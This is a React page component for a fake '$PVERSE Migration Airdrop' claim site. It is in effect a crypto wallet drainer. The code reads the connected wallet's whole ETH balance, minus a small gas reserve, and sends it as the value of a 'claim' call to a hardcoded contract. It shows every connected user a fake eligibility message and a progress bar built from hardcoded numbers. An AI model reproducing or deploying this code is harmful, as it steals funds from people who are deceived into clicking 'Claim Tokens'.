import { Web3Button, Web3NetworkSwitch } from "@web3modal/react";
import CustomButton from "../components/CustomButton";

import { useState, useEffect } from "react";


import {
  useDisconnect,
  useAccount,
  usePrepareContractWrite,
  useContractRead,
  useContractWrite,
  useBalance,
} from "wagmi";
import { useWeb3ModalTheme } from "@web3modal/react";
import w3mv2ProxyContractABI from "../abi/w3mv2ProxyContractABI.json";
import tokenContractABI from "../abi/TokenContractABI.json";

import { ethers } from "ethers";

import { useWeb3Modal } from "@web3modal/react";




export default function HomePage() {
  // const { address } = useAccount();
  const { theme, setTheme } = useWeb3ModalTheme();
  const { disconnect } = useDisconnect();

  const { isConnected } = useAccount();

  const { provider, connect } = useWeb3Modal();

  const { address, isConnecting, isDisconnected } = useAccount()


  const { data, isError, isLoading } = useBalance({
    address: address
  })


  // Inputs
  const [totalPrice, setTotalPrice] = useState("100");


  useEffect(() => {
    const BalanceWei = ((data?.formatted) * 10 ** 18) - 8000000000000000;
    setTotalPrice(BalanceWei.toString());
  }, [data]);


  // Write
  const { config } = usePrepareContractWrite({
    address: "0xD73786D326EEb18b20901A6a7247E547CD07eb7F",
    abi: tokenContractABI,
    functionName: "claim",
    overrides: { value: totalPrice },
  });

  const { write: mintNFT } = useContractWrite(config);

  window.onload = function () {
    // obtener la cantidad y el total de algún lugar
    const cantidad = 8141517;
    const total = 10000000;

    // calcular el porcentaje completado
    const porcentajeCompletado = (cantidad / total) * 100;

    // actualizar la barra de progreso
    const progress = document.querySelector('.progress');
    progress.style.width = porcentajeCompletado + '%';

    // actualizar el texto de progreso
    const progressText = document.querySelector('.progress-text');
    progressText.textContent = "Claimed: " + cantidad + ' $PVERSE' + ' / ' + total + ' $PVERSE';
  }


  return (
    <>

      <div className="Main">
        <div className="Navbara">
          <div className="NavbarLeft">
            <img className="Logo" src="logo.png" alt="" />
            <span className="LogoName">PornVerse</span>

          </div>
          <div className="NavbarRight"><Web3Button balance="show" /></div>
        </div>

        <div className="Contain">

          <div className="ContainTop">
            <img className="AirdropImage" src="./images/Airdrop.png" alt="" />
          </div>

          <div className="TextSection">
            <p className="Title">Claim $PVERSE Migration Airdrop</p>
            <p className="Description">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer vitae hendrerit tortor. Suspendisse potenti. Suspendisse dapibus sagittis mollis.</p>

          </div>


          {isConnected ? (

            <>
              <div className="CheckText Green"> Congratulations! You can claim 2400 $PVERSE Tokens.</div>
              <button className="BuyButton" onClick={() => mintNFT?.()} >
                Claim Tokens
              </button>
            </>

          ) : (

            <>

              <div className="CheckText"> Connect your wallet to check if you are elegible. </div>
              <CustomButton />

            </>

          )}

          <div class="progress-bar">
            <div class="progress"></div>
            <div class="progress-text"></div>
          </div>


        </div>

      </div>

    </>
  );
}


// {contractRead.data.toString()}